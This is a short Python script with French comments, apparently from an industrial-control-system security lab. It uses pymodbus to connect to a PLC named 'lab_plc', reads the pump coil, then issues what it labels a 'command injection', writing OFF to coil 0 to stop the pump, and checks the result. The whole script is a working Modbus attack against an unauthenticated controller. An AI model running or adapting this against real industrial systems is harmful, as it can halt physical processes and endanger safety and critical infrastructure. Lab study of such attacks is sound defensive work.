from pymodbus.client import ModbusTcpClient
import time

target_ip = "lab_plc"
client = ModbusTcpClient(target_ip)

# 1. Vérifier l'état (Lecture)
result = client.read_coils(0, 1)
print(f"État actuel Pompe (Coil 0): {result.bits[0]}")

# 2. INJECTION DE COMMANDE (Write Single Coil - Code 05)
print("--- INJECTION DE COMMANDE D'ARRÊT ---")
client.write_coil(0, False) # False = 0 = OFF

# 3. Vérification
result = client.read_coils(0, 1)
print(f"Nouvel état Pompe: {result.bits[0]}")